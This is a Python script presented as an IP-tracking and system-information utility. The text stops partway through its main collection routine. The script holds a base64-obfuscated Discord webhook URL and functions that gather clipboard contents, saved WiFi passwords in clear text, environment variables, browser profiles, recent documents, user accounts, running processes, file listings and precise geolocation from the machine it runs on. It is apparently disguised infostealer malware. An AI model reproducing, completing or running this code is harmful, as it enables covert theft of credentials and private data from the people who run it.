#! /usr/bin/python3

"""
Author: Ali Shahid
Github: https://github.com/shaeinst/ipX
website: https://shaeinst.github.io/

ULTRA-COMPREHENSIVE SYSTEM INFO COLLECTOR
Collects maximum possible information without admin privileges
"""

import base64

# --- Encrypted Discord Webhook URL ---
_ENCRYPTED_WEBHOOK = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ0OTU4MzcxMDEzODY2NzAxOS9qd1hOM0JZZkdxeTgxbUZZM1BoQ2RUX1A3X2YxaHJFbTlLUVBCU0ZHSlZUUTNiNElvYkdUWUVzLV82NG9pT0FxbVExZQ=="

def _decode_webhook():
    return base64.b64decode(_ENCRYPTED_WEBHOOK).decode('utf-8')

WEBHOOK_URL = _decode_webhook()
# -------------------------------------

try:
    import argparse
    import platform
    import socket
    from requests import get, post
    from datetime import datetime
    import json
    import psutil
    from tabulate import tabulate
    import getpass
    import uuid
    import sys
    import os
    import geocoder
    from collections import defaultdict
    import time
    import subprocess
    import locale
    import hashlib
    import glob
    import re

except ImportError as e:
    print("-------------------------------------------------------")
    print("🚨 FATAL ERROR: Required Python library is missing.")
    print(f"Please install: pip install requests psutil tabulate geocoder")
    print("-------------------------------------------------------")
    exit()

# ----------------------------------------------------------------------------
#           ARGUMENT SETUP
# ----------------------------------------------------------------------------
parser = argparse.ArgumentParser()
parser.add_argument("-i","--ip", default=1, help="ip address to track")
parser.add_argument("-I","--myip", "--self", action="store_true", help="get your own external IP details")
parser.add_argument("-o", "--output", default="result.json", help="save details to file")
parser.add_argument("-no","--nooutput", action="store_true", help="don't show output, just send")
parser.add_argument("--scan-depth", type=int, default=2, help="directory scan depth (default: 2)")
parser.add_argument("--max-files", type=int, default=150, help="max files per directory (default: 150)")
parser.add_argument("--deep-scan", action="store_true", help="enable deep system scanning (slower)")

args = parser.parse_args()

ip_address = args.ip
my_ip = args.myip or (ip_address == 1) 
file_name = args.output
file_name_ext = file_name.split(".")[-1]
if len(file_name.split(".")) < 2:
    file_name_ext = "json"
nooutput = args.nooutput
webhook_url = WEBHOOK_URL
SCAN_DEPTH = args.scan_depth
MAX_FILES_PER_DIR = args.max_files
DEEP_SCAN = args.deep_scan

# ============================================================================
#                       INFORMATION COLLECTION FUNCTIONS
# ============================================================================

# --- SYSTEM INFORMATION ---
def getSystemInfo():
    """Deep system information"""
    info = {}
    try:
        info["hostname"] = socket.gethostname()
        info["fqdn"] = socket.getfqdn()
        info["platform"] = platform.platform()
        info["system"] = platform.system()
        info["release"] = platform.release()
        info["version"] = platform.version()
        info["machine"] = platform.machine()
        info["processor"] = platform.processor()
        info["architecture"] = platform.architecture()
        info["python_version"] = sys.version
        info["python_compiler"] = platform.python_compiler()
        info["python_build"] = platform.python_build()
        info["python_implementation"] = platform.python_implementation()
        
        # System paths
        info["executable"] = sys.executable
        info["sys_path"] = sys.path[:5]  # First 5 paths
        
        # User info
        info["username"] = getpass.getuser()
        info["home_directory"] = os.path.expanduser("~")
        info["current_directory"] = os.getcwd()
        
        # System identifiers
        try:
            info["mac_address"] = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) 
                                           for elements in range(0,2*6,2)][::-1])
            info["machine_id"] = str(uuid.uuid1())
            info["system_uuid"] = str(uuid.uuid4())
        except:
            pass
        
        # Boot and uptime
        try:
            boot_time = psutil.boot_time()
            info["boot_time"] = datetime.fromtimestamp(boot_time).strftime("%Y-%m-%d %H:%M:%S")
            info["uptime_seconds"] = int(time.time() - boot_time)
            info["uptime_formatted"] = f"{int((time.time() - boot_time) / 3600)}h {int(((time.time() - boot_time) % 3600) / 60)}m"
        except:
            pass
        
        # Locale information
        try:
            info["locale"] = locale.getdefaultlocale()
            info["encoding"] = sys.getdefaultencoding()
        except:
            pass
        
    except Exception as e:
        info["error"] = str(e)
    
    return info

# --- CPU INFORMATION ---
def getCPUInfo():
    """Comprehensive CPU details"""
    try:
        cpu_freq = psutil.cpu_freq()
        cpu_info = {
            "physical_cores": psutil.cpu_count(logical=False),
            "total_cores": psutil.cpu_count(logical=True),
            "max_frequency_mhz": f"{cpu_freq.max:.2f}" if cpu_freq else "N/A",
            "min_frequency_mhz": f"{cpu_freq.min:.2f}" if cpu_freq else "N/A",
            "current_frequency_mhz": f"{cpu_freq.current:.2f}" if cpu_freq else "N/A",
            "cpu_usage_percent": f"{psutil.cpu_percent(interval=1)}",
        }
        
        # Per-core usage
        try:
            per_core = psutil.cpu_percent(percpu=True, interval=0.5)
            cpu_info["per_core_usage"] = [f"Core {i}: {p}%" for i, p in enumerate(per_core)]
        except:
            pass
        
        # CPU times
        try:
            cpu_times = psutil.cpu_times()
            cpu_info["cpu_times"] = {
                "user": cpu_times.user,
                "system": cpu_times.system,
                "idle": cpu_times.idle
            }
        except:
            pass
        
        # CPU stats
        try:
            cpu_stats = psutil.cpu_stats()
            cpu_info["context_switches"] = cpu_stats.ctx_switches
            cpu_info["interrupts"] = cpu_stats.interrupts
            cpu_info["soft_interrupts"] = cpu_stats.soft_interrupts
            cpu_info["syscalls"] = cpu_stats.syscalls
        except:
            pass
        
        return cpu_info
    except:
        return {"error": "Unable to retrieve CPU info"}

# --- MEMORY INFORMATION ---
def getMemoryInfo():
    """Detailed memory information"""
    try:
        svmem = psutil.virtual_memory()
        swap = psutil.swap_memory()
        
        memory_info = {
            "virtual_memory": {
                "total_gb": f"{svmem.total / (1024**3):.2f}",
                "available_gb": f"{svmem.available / (1024**3):.2f}",
                "used_gb": f"{svmem.used / (1024**3):.2f}",
                "free_gb": f"{svmem.free / (1024**3):.2f}",
                "percent_used": f"{svmem.percent}",
                "active_gb": f"{svmem.active / (1024**3):.2f}" if hasattr(svmem, 'active') else "N/A",
                "inactive_gb": f"{svmem.inactive / (1024**3):.2f}" if hasattr(svmem, 'inactive') else "N/A",
                "buffers_gb": f"{svmem.buffers / (1024**3):.2f}" if hasattr(svmem, 'buffers') else "N/A",
                "cached_gb": f"{svmem.cached / (1024**3):.2f}" if hasattr(svmem, 'cached') else "N/A",
            },
            "swap_memory": {
                "total_gb": f"{swap.total / (1024**3):.2f}",
                "used_gb": f"{swap.used / (1024**3):.2f}",
                "free_gb": f"{swap.free / (1024**3):.2f}",
                "percent_used": f"{swap.percent}",
                "sin_mb": f"{swap.sin / (1024**2):.2f}",
                "sout_mb": f"{swap.sout / (1024**2):.2f}",
            }
        }
        return memory_info
    except:
        return {"error": "Unable to retrieve memory info"}

# --- DISK INFORMATION ---
def getDiskInfo():
    """Comprehensive disk information"""
    disk_info = {"partitions": {}, "io_stats": {}}
    
    try:
        partitions = psutil.disk_partitions(all=True)
        for partition in partitions:
            try:
                usage = psutil.disk_usage(partition.mountpoint)
                disk_info["partitions"][partition.device] = {
                    "mountpoint": partition.mountpoint,
                    "fstype": partition.fstype,
                    "opts": partition.opts,
                    "total_gb": f"{usage.total / (1024**3):.2f}",
                    "used_gb": f"{usage.used / (1024**3):.2f}",
                    "free_gb": f"{usage.free / (1024**3):.2f}",
                    "percent_used": f"{usage.percent}",
                }
            except (PermissionError, OSError):
                continue
        
        # Disk I/O statistics
        try:
            disk_io = psutil.disk_io_counters()
            if disk_io:
                disk_info["io_stats"] = {
                    "read_count": disk_io.read_count,
                    "write_count": disk_io.write_count,
                    "read_mb": f"{disk_io.read_bytes / (1024**2):.2f}",
                    "write_mb": f"{disk_io.write_bytes / (1024**2):.2f}",
                    "read_time_ms": disk_io.read_time,
                    "write_time_ms": disk_io.write_time,
                }
        except:
            pass
            
    except:
        pass
    
    return disk_info

# --- NETWORK INFORMATION ---
def getNetworkInfo():
    """Deep network interface information"""
    net_info = {}
    try:
        if_addrs = psutil.net_if_addrs()
        if_stats = psutil.net_if_stats()
        
        for interface_name, addr_list in if_addrs.items():
            info = {}
            for addr in addr_list:
                try:
                    if addr.family == socket.AF_INET:
                        info["ipv4_address"] = addr.address
                        info["ipv4_netmask"] = addr.netmask
                        if addr.broadcast:
                            info["ipv4_broadcast"] = addr.broadcast
                    elif addr.family == socket.AF_INET6:
                        info["ipv6_address"] = addr.address
                        info["ipv6_netmask"] = addr.netmask
                    elif addr.family == psutil.AF_LINK:
                        info["mac_address"] = addr.address
                except:
                    continue
            
            # Interface statistics
            try:
                if interface_name in if_stats:
                    stats = if_stats[interface_name]
                    info["is_up"] = stats.isup
                    info["duplex"] = str(stats.duplex)
                    info["speed_mbps"] = stats.speed if stats.speed > 0 else "N/A"
                    info["mtu"] = stats.mtu
            except:
                pass
            
            if info:
                net_info[interface_name] = info
                
        # Network I/O counters per interface
        try:
            io_counters = psutil.net_io_counters(pernic=True)
            for interface, counter in io_counters.items():
                if interface in net_info:
                    net_info[interface]["bytes_sent_mb"] = f"{counter.bytes_sent / (1024**2):.2f}"
                    net_info[interface]["bytes_recv_mb"] = f"{counter.bytes_recv / (1024**2):.2f}"
                    net_info[interface]["packets_sent"] = counter.packets_sent
                    net_info[interface]["packets_recv"] = counter.packets_recv
                    net_info[interface]["errin"] = counter.errin
                    net_info[interface]["errout"] = counter.errout
                    net_info[interface]["dropin"] = counter.dropin
                    net_info[interface]["dropout"] = counter.dropout
        except:
            pass
                
    except:
        pass
    
    return net_info

# --- NETWORK STATISTICS ---
def getNetworkStats():
    """Overall network statistics"""
    try:
        net_io = psutil.net_io_counters()
        
        # Active connections count by status
        connections = psutil.net_connections(kind='inet')
        conn_status = defaultdict(int)
        for conn in connections:
            conn_status[conn.status] += 1
        
        stats = {
            "bytes_sent_mb": f"{net_io.bytes_sent / (1024**2):.2f}",
            "bytes_recv_mb": f"{net_io.bytes_recv / (1024**2):.2f}",
            "packets_sent": net_io.packets_sent,
            "packets_recv": net_io.packets_recv,
            "errin": net_io.errin,
            "errout": net_io.errout,
            "dropin": net_io.dropin,
            "dropout": net_io.dropout,
            "active_connections": dict(conn_status),
            "total_connections": len(connections)
        }
        return stats
    except:
        return {"error": "Unable to retrieve network stats"}

# --- NETWORK CONNECTIONS ---
def getNetworkConnections():
    """Detailed active network connections"""
    try:
        connections = []
        for conn in psutil.net_connections(kind='inet'):
            try:
                connections.append({
                    "fd": conn.fd,
                    "family": str(conn.family),
                    "type": str(conn.type),
                    "local_address": f"{conn.laddr.ip}:{conn.laddr.port}" if conn.laddr else "N/A",
                    "remote_address": f"{conn.raddr.ip}:{conn.raddr.port}" if conn.raddr else "N/A",
                    "status": conn.status,
                    "pid": conn.pid
                })
            except:
                continue
        
        # Sort by PID and limit
        connections.sort(key=lambda x: x['pid'] if x['pid'] else 0)
        return {"connections": connections[:100], "total": len(connections)}
    except:
        return {"error": "Unable to retrieve connections"}

# --- PROCESS INFORMATION ---
def getDetailedProcessInfo():
    """Comprehensive process information"""
    processes = []
    summary = {
        "total_processes": 0,
        "total_threads": 0,
        "by_user": defaultdict(int),
        "by_status": defaultdict(int)
    }
    
    try:
        for proc in psutil.process_iter(['pid', 'name', 'username', 'status', 'cpu_percent', 
                                        'memory_percent', 'memory_info', 'num_threads', 
                                        'create_time', 'cmdline', 'cwd', 'exe', 'ppid',
                                        'num_fds', 'num_handles']):
            try:
                pinfo = proc.info
                
                process_details = {
                    "pid": pinfo['pid'],
                    "ppid": pinfo.get('ppid', 'N/A'),
                    "name": pinfo['name'],
                    "exe": pinfo.get('exe', 'N/A'),
                    "cwd": pinfo.get('cwd', 'N/A'),
                    "username": pinfo.get('username', 'N/A'),
                    "status": pinfo['status'],
                    "cpu_percent": round(pinfo.get('cpu_percent', 0) or 0, 2),
                    "memory_percent": round(pinfo.get('memory_percent', 0) or 0, 2),
                    "memory_mb": round((pinfo['memory_info'].rss / (1024**2)) if pinfo.get('memory_info') else 0, 2),
                    "threads": pinfo.get('num_threads', 0),
                    "handles": pinfo.get('num_handles', 0) or pinfo.get('num_fds', 0) or 0,
                    "started": datetime.fromtimestamp(pinfo['create_time']).strftime("%Y-%m-%d %H:%M:%S") if pinfo.get('create_time') else "N/A",
                    "cmdline": " ".join(pinfo['cmdline'][:5]) if pinfo.get('cmdline') else "N/A"
                }
                
                processes.append(process_details)
                
                summary["total_processes"] += 1
                summary["total_threads"] += process_details["threads"]
                summary["by_user"][process_details["username"]] += 1
                summary["by_status"][process_details["status"]] += 1
                
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                continue
        
        # Sort and categorize
        top_cpu = sorted(processes, key=lambda x: x['cpu_percent'], reverse=True)[:20]
        top_memory = sorted(processes, key=lambda x: x['memory_percent'], reverse=True)[:20]
        
        return {
            "summary": dict(summary),
            "top_cpu": top_cpu,
            "top_memory": top_memory,
            "all_processes": processes
        }
        
    except Exception as e:
        return {"error": f"Process info error: {str(e)}"}

# --- FILE SYSTEM SCAN ---
def scanFilesAndFolders(max_depth=2, max_files=150):
    """Deep file system scan"""
    results = {
        "scan_time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "scanned_directories": [],
        "largest_files": [],
        "recently_modified": [],
        "recently_accessed": [],
        "file_types": defaultdict(int),
        "total_files": 0,
        "total_dirs": 0,
        "total_size_gb": 0
    }
    
    # Directories to scan
    if platform.system() == "Windows":
        scan_paths = [
            os.path.expanduser("~"),
            os.path.expanduser("~\\Desktop"),
            os.path.expanduser("~\\Documents"),
            os.path.expanduser("~\\Downloads"),
            os.path.expanduser("~\\Pictures"),
            os.path.expanduser("~\\Videos"),
            os.path.expanduser("~\\Music"),
            "C:\\Program Files",
            "C:\\Program Files (x86)",
            "C:\\ProgramData"
        ]
    else:
        scan_paths = [
            os.path.expanduser("~"),
            os.path.expanduser("~/Desktop"),
            os.path.expanduser("~/Documents"),
            os.path.expanduser("~/Downloads"),
            os.path.expanduser("~/Pictures"),
            os.path.expanduser("~/Videos"),
            os.path.expanduser("~/Music"),
            "/usr/bin",
            "/usr/local/bin",
            "/opt",
            "/etc"
        ]
    
    all_files = []
    total_size = 0
    
    for base_path in scan_paths:
        if not os.path.exists(base_path):
            continue
        
        try:
            results["scanned_directories"].append(base_path)
            
            for root, dirs, files in os.walk(base_path):
                depth = root[len(base_path):].count(os.sep)
                if depth >= max_depth:
                    dirs.clear()
                    continue
                
                results["total_dirs"] += len(dirs)
                
                for file in files[:max_files]:
                    try:
                        file_path = os.path.join(root, file)
                        stat_info = os.stat(file_path)
                        
                        file_info = {
                            "name": file,
                            "path": file_path,
                            "size": stat_info.st_size,
                            "modified": stat_info.st_mtime,
                            "accessed": stat_info.st_atime,
                            "created": stat_info.st_ctime
                        }
                        
                        all_files.append(file_info)
                        results["total_files"] += 1
                        total_size += stat_info.st_size
                        
                        ext = os.path.splitext(file)[1].lower() or "no_ext"
                        results["file_types"][ext] += 1
                        
                    except (PermissionError, OSError, FileNotFoundError):
                        continue
                        
        except (PermissionError, OSError):
            continue
    
    results["total_size_gb"] = f"{total_size / (1024**3):.2f}"
    
    # Top files by size
    all_files.sort(key=lambda x: x["size"], reverse=True)
    results["largest_files"] = [
        {
            "name": f["name"],
            "path": f["path"][:120] + "..." if len(f["path"]) > 120 else f["path"],
            "size_mb": f"{f['size'] / (1024**2):.2f}"
        }
        for f in all_files[:30]
    ]
    
    # Recently modified
    all_files.sort(key=lambda x: x["modified"], reverse=True)
    results["recently_modified"] = [
        {
            "name": f["name"],
            "path": f["path"][:120] + "..." if len(f["path"]) > 120 else f["path"],
            "modified": datetime.fromtimestamp(f["modified"]).strftime("%Y-%m-%d %H:%M:%S")
        }
        for f in all_files[:30]
    ]
    
    # Recently accessed
    all_files.sort(key=lambda x: x["accessed"], reverse=True)
    results["recently_accessed"] = [
        {
            "name": f["name"],
            "path": f["path"][:120] + "..." if len(f["path"]) > 120 else f["path"],
            "accessed": datetime.fromtimestamp(f["accessed"]).strftime("%Y-%m-%d %H:%M:%S")
        }
        for f in all_files[:30]
    ]
    
    # Top file types
    file_types_sorted = sorted(results["file_types"].items(), key=lambda x: x[1], reverse=True)
    results["file_types"] = dict(file_types_sorted[:40])
    
    return results

# --- BROWSER HISTORY & DATA ---
def getBrowserData():
    """Extract browser information"""
    browser_info = {}
    
    try:
        home = os.path.expanduser("~")
        
        # Chrome/Chromium paths
        if platform.system() == "Windows":
            chrome_paths = [
                os.path.join(home, "AppData", "Local", "Google", "Chrome", "User Data"),
                os.path.join(home, "AppData", "Local", "Microsoft", "Edge", "User Data"),
            ]
        elif platform.system() == "Darwin":  # macOS
            chrome_paths = [
                os.path.join(home, "Library", "Application Support", "Google", "Chrome"),
                os.path.join(home, "Library", "Application Support", "Microsoft Edge"),
            ]
        else:  # Linux
            chrome_paths = [
                os.path.join(home, ".config", "google-chrome"),
                os.path.join(home, ".config", "chromium"),
            ]
        
        # Firefox paths
        if platform.system() == "Windows":
            firefox_paths = [os.path.join(home, "AppData", "Roaming", "Mozilla", "Firefox", "Profiles")]
        elif platform.system() == "Darwin":
            firefox_paths = [os.path.join(home, "Library", "Application Support", "Firefox", "Profiles")]
        else:
            firefox_paths = [os.path.join(home, ".mozilla", "firefox")]
        
        # Check Chrome/Edge
        for path in chrome_paths:
            if os.path.exists(path):
                browser_name = "Chrome" if "Chrome" in path else "Edge"
                try:
                    profiles = [d for d in os.listdir(path) if os.path.isdir(os.path.join(path, d)) and d.startswith("Default") or d.startswith("Profile")]
                    browser_info[browser_name] = {
                        "installed": True,
                        "path": path,
                        "profiles": profiles,
                        "profile_count": len(profiles)
                    }
                except:
                    browser_info[browser_name] = {"installed": True, "path": path}
        
        # Check Firefox
        for path in firefox_paths:
            if os.path.exists(path):
                try:
                    profiles = [d for d in os.listdir(path) if os.path.isdir(os.path.join(path, d))]
                    browser_info["Firefox"] = {
                        "installed": True,
                        "path": path,
                        "profiles": profiles,
                        "profile_count": len(profiles)
                    }
                except:
                    browser_info["Firefox"] = {"installed": True, "path": path}
                    
    except Exception as e:
        browser_info["error"] = str(e)
    
    return browser_info

# --- INSTALLED SOFTWARE (Windows Registry) ---
def getInstalledSoftware():
    """Get installed software list (Windows)"""
    if platform.system() != "Windows":
        return {"info": "Only available on Windows"}
    
    software = []
    try:
        import winreg
        
        reg_paths = [
            (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall"),
            (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"),
            (winreg.HKEY_CURRENT_USER, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall")
        ]
        
        for hkey, reg_path in reg_paths:
            try:
                key = winreg.OpenKey(hkey, reg_path)
                for i in range(winreg.QueryInfoKey(key)[0]):
                    try:
                        subkey_name = winreg.EnumKey(key, i)
                        subkey = winreg.OpenKey(key, subkey_name)
                        
                        try:
                            name = winreg.QueryValueEx(subkey, "DisplayName")[0]
                            version = winreg.QueryValueEx(subkey, "DisplayVersion")[0] if winreg.QueryValueEx(subkey, "DisplayVersion") else "N/A"
                            publisher = winreg.QueryValueEx(subkey, "Publisher")[0] if winreg.QueryValueEx(subkey, "Publisher") else "N/A"
                            install_date = winreg.QueryValueEx(subkey, "InstallDate")[0] if winreg.QueryValueEx(subkey, "InstallDate") else "N/A"
                            
                            software.append({
                                "name": name,
                                "version": version,
                                "publisher": publisher,
                                "install_date": install_date
                            })
                        except:
                            pass
                        winreg.CloseKey(subkey)
                    except:
                        continue
                winreg.CloseKey(key)
            except:
                continue
                
    except ImportError:
        return {"error": "winreg not available"}
    except Exception as e:
        return {"error": str(e)}
    
    return {"software": software[:200], "total_count": len(software)}

# --- ENVIRONMENT VARIABLES ---
def getEnvironmentVariables():
    """Get all environment variables"""
    try:
        env = dict(os.environ)
        # Sanitize sensitive info
        sanitized = {}
        for key, value in env.items():
            if len(value) > 500:
                sanitized[key] = value[:500] + "..."
            else:
                sanitized[key] = value
        return sanitized
    except:
        return {"error": "Unable to retrieve environment variables"}

# --- USER ACCOUNTS ---
def getUserAccounts():
    """Get system user accounts"""
    users = []
    try:
        if platform.system() == "Windows":
            import winreg
            try:
                key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList")
                for i in range(winreg.QueryInfoKey(key)[0]):
                    try:
                        subkey_name = winreg.EnumKey(key, i)
                        subkey = winreg.OpenKey(key, subkey_name)
                        try:
                            profile_path = winreg.QueryValueEx(subkey, "ProfileImagePath")[0]
                            users.append(profile_path.split("\\")[-1])
                        except:
                            pass
                        winreg.CloseKey(subkey)
                    except:
                        continue
                winreg.CloseKey(key)
            except:
                pass
        else:
            # Unix-like systems
            try:
                with open('/etc/passwd', 'r') as f:
                    for line in f:
                        parts = line.split(':')
                        if len(parts) >= 6:
                            users.append({
                                "username": parts[0],
                                "uid": parts[2],
                                "gid": parts[3],
                                "home": parts[5]
                            })
            except:
                pass
                
    except Exception as e:
        return {"error": str(e)}
    
    return {"users": users[:50], "total_count": len(users)}

# --- STARTUP PROGRAMS ---
def getStartupPrograms():
    """Get programs that run on startup"""
    startup = []
    try:
        if platform.system() == "Windows":
            import winreg
            reg_paths = [
                (winreg.HKEY_CURRENT_USER, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"),
                (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"),
            ]
            
            for hkey, path in reg_paths:
                try:
                    key = winreg.OpenKey(hkey, path)
                    for i in range(winreg.QueryInfoKey(key)[1]):
                        try:
                            name, value, _ = winreg.EnumValue(key, i)
                            startup.append({"name": name, "command": value, "location": path})
                        except:
                            continue
                    winreg.CloseKey(key)
                except:
                    continue
        else:
            # Linux/Mac autostart
            autostart_dirs = [
                os.path.expanduser("~/.config/autostart"),
                "/etc/xdg/autostart"
            ]
            for dir_path in autostart_dirs:
                if os.path.exists(dir_path):
                    try:
                        for file in os.listdir(dir_path):
                            if file.endswith('.desktop'):
                                startup.append({"name": file, "location": dir_path})
                    except:
                        continue
                        
    except Exception as e:
        return {"error": str(e)}
    
    return {"startup_programs": startup, "count": len(startup)}

# --- BATTERY INFO ---
def getBatteryInfo():
    """Battery information (laptops)"""
    try:
        battery = psutil.sensors_battery()
        if battery:
            return {
                "percent": f"{battery.percent}",
                "power_plugged": battery.power_plugged,
                "time_left_minutes": battery.secsleft // 60 if battery.secsleft != psutil.POWER_TIME_UNLIMITED else "Unlimited"
            }
        return {"info": "No battery detected"}
    except:
        return {"error": "Battery info unavailable"}

# --- TEMPERATURE SENSORS ---
def getTemperatureInfo():
    """Hardware temperature sensors"""
    try:
        temps = psutil.sensors_temperatures()
        if temps:
            temp_info = {}
            for name, entries in temps.items():
                temp_info[name] = []
                for entry in entries:
                    temp_info[name].append({
                        "label": entry.label,
                        "current": f"{entry.current}°C",
                        "high": f"{entry.high}°C" if entry.high else "N/A",
                        "critical": f"{entry.critical}°C" if entry.critical else "N/A"
                    })
            return temp_info
        return {"info": "No temperature sensors detected"}
    except:
        return {"error": "Temperature info unavailable"}

# --- GEOLOCATION ---
def getExactLocation():
    """Precise geolocation"""
    try:
        g = geocoder.ip('me')
        if g.ok:
            return {
                "latitude": g.latlng[0] if g.latlng else "N/A",
                "longitude": g.latlng[1] if g.latlng else "N/A",
                "city": g.city or "N/A",
                "state": g.state or "N/A",
                "country": g.country or "N/A",
                "postal_code": g.postal or "N/A",
                "address": g.address or "N/A"
            }
        return None
    except:
        return None

# --- CLIPBOARD CONTENT ---
def getClipboardContent():
    """Get clipboard content (if possible)"""
    try:
        if platform.system() == "Windows":
            import win32clipboard
            win32clipboard.OpenClipboard()
            data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            return {"content": data[:500] + "..." if len(data) > 500 else data}
        elif platform.system() == "Darwin":
            import subprocess
            result = subprocess.run(['pbpaste'], capture_output=True, text=True)
            content = result.stdout
            return {"content": content[:500] + "..." if len(content) > 500 else content}
        else:
            # Linux - requires xclip or xsel
            import subprocess
            try:
                result = subprocess.run(['xclip', '-selection', 'clipboard', '-o'], capture_output=True, text=True)
                content = result.stdout
                return {"content": content[:500] + "..." if len(content) > 500 else content}
            except:
                return {"info": "xclip not installed"}
    except:
        return {"error": "Clipboard access failed"}

# --- RECENT DOCUMENTS ---
def getRecentDocuments():
    """Get recently accessed documents"""
    recent = []
    try:
        home = os.path.expanduser("~")
        
        if platform.system() == "Windows":
            recent_path = os.path.join(home, "AppData", "Roaming", "Microsoft", "Windows", "Recent")
        elif platform.system() == "Darwin":
            recent_path = os.path.join(home, "Library", "Recent")
        else:
            recent_path = os.path.join(home, ".local", "share", "recently-used.xbel")
        
        if os.path.exists(recent_path) and os.path.isdir(recent_path):
            for file in os.listdir(recent_path)[:50]:
                try:
                    file_path = os.path.join(recent_path, file)
                    stat = os.stat(file_path)
                    recent.append({
                        "name": file,
                        "accessed": datetime.fromtimestamp(stat.st_atime).strftime("%Y-%m-%d %H:%M:%S")
                    })
                except:
                    continue
                    
    except Exception as e:
        return {"error": str(e)}
    
    return {"recent_documents": recent, "count": len(recent)}

# --- WIFI NETWORKS ---
def getWifiNetworks():
    """Get saved WiFi networks (Windows)"""
    if platform.system() != "Windows":
        return {"info": "Only available on Windows"}
    
    networks = []
    try:
        result = subprocess.run(['netsh', 'wlan', 'show', 'profiles'], capture_output=True, text=True)
        profiles = re.findall(r'All User Profile\s*:\s*(.*)', result.stdout)
        
        for profile in profiles[:20]:
            profile = profile.strip()
            try:
                details = subprocess.run(['netsh', 'wlan', 'show', 'profile', profile, 'key=clear'], 
                                       capture_output=True, text=True)
                password = re.search(r'Key Content\s*:\s*(.*)', details.stdout)
                networks.append({
                    "ssid": profile,
                    "password": password.group(1).strip() if password else "N/A"
                })
            except:
                networks.append({"ssid": profile, "password": "N/A"})
                
    except Exception as e:
        return {"error": str(e)}
    
    return {"networks": networks, "count": len(networks)}

# --- SCHEDULED TASKS ---
def getScheduledTasks():
    """Get scheduled tasks (Windows) or cron jobs (Linux)"""
    tasks = []
    try:
        if platform.system() == "Windows":
            result = subprocess.run(['schtasks', '/query', '/fo', 'LIST', '/v'], 
                                  capture_output=True, text=True)
            task_names = re.findall(r'TaskName:\s*(.+)', result.stdout)
            tasks = [{"task": name.strip()} for name in task_names[:50]]
        else:
            # Linux cron jobs
            try:
                result = subprocess.run(['crontab', '-l'], capture_output=True, text=True)
                cron_jobs = [line for line in result.stdout.split('\n') if line and not line.startswith('#')]
                tasks = [{"cron_job": job} for job in cron_jobs[:30]]
            except:
                pass
                
    except Exception as e:
        return {"error": str(e)}
    
    return {"tasks": tasks, "count": len(tasks)}

# --- ACTIVE WINDOWS ---
def getActiveWindows():
    """Get currently open windows (Windows)"""
    if platform.system() != "Windows":
        return {"info": "Only available on Windows"}
    
    windows = []
    try:
        import win32gui
        
        def callback(hwnd, windows):
            if win32gui.IsWindowVisible(hwnd):
                title = win32gui.GetWindowText(hwnd)
                if title:
                    windows.append(title)
        
        win32gui.EnumWindows(callback, windows)
        
    except ImportError:
        return {"error": "pywin32 not installed"}
    except Exception as e:
        return {"error": str(e)}
    
    return {"windows": windows[:50], "count": len(windows)}

# --- SCREEN INFORMATION ---
def getScreenInfo():
    """Get display/monitor information"""
    try:
        if platform.system() == "Windows":
            import win32api
            monitors = []
            for i, monitor in enumerate(win32api.EnumDisplayMonitors()):
                info = win32api.GetMonitorInfo(monitor[0])
                monitors.append({
                    "monitor": i+1,
                    "resolution": f"{info['Monitor'][2]}x{info['Monitor'][3]}",
                    "work_area": info['Work']
                })
            return {"monitors": monitors}
        else:
            # Try xrandr for Linux
            try:
                result = subprocess.run(['xrandr'], capture_output=True, text=True)
                connected = re.findall(r'(\S+)\s+connected.*?(\d+x\d+)', result.stdout)
                monitors = [{"name": name, "resolution": res} for name, res in connected]
                return {"monitors": monitors}
            except:
                return {"info": "Display info unavailable"}
    except:
        return {"error": "Screen info unavailable"}

# --- USB DEVICES ---
def getUSBDevices():
    """Get connected USB devices (Windows)"""
    if platform.system() != "Windows":
        return {"info": "Only available on Windows"}
    
    devices = []
    try:
        import winreg
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Enum\USB")
        
        for i in range(winreg.QueryInfoKey(key)[0]):
            try:
                subkey_name = winreg.EnumKey(key, i)
                devices.append(subkey_name)
            except:
                continue
        winreg.CloseKey(key)
        
    except Exception as e:
        return {"error": str(e)}
    
    return {"usb_devices": devices[:30], "count": len(devices)}

# --- PRINTERS ---
def getPrinters():
    """Get installed printers (Windows)"""
    if platform.system() != "Windows":
        return {"info": "Only available on Windows"}
    
    printers = []
    try:
        import win32print
        printers = [printer[2] for printer in win32print.EnumPrinters(win32print.PRINTER_ENUM_LOCAL)]
    except ImportError:
        return {"error": "pywin32 not installed"}
    except Exception as e:
        return {"error": str(e)}
    
    return {"printers": printers, "count": len(printers)}

# --- MAIN COLLECTION FUNCTION ---
def collectAllInformation():
    """Collect ALL available system information"""
    print("\n" + "="*80)
    print("🔍 ULTRA-COMPREHENSIVE SYSTEM INFORMATION COLLECTION")
    print("="*80 + "\n")
    
    all_data = {}
    
    sections = [
        ("System Information", getSystemInfo),
        ("CPU Information", getCPUInfo),
        ("Memory Information", getMemoryInfo),
        ("Disk Information", getDiskInfo),
        ("Network Interfaces", getNetworkInfo),
        ("Network Statistics", getNetworkStats),
        ("Network Connections", getNetworkConnections),
        ("Process Information", getDetailedProcessInfo),
        ("Battery Information", getBatteryInfo),
        ("Temperature Sensors", getTemperatureInfo),
        ("Geolocation", getExactLocation),
        ("Environment Variables", getEnvironmentVariables),
        ("User Accounts", getUserAccounts),
        ("Startup Programs", getStartupPrograms),
        ("Browser Data", getBrowserData),
        ("Installed Software", getInstalledSoftware),
        ("Recent Documents", getRecentDocuments),
        ("Scheduled Tasks", getScheduledTasks),
        ("Screen Information", getScreenInfo),
        ("USB Devices", getUSBDevices),
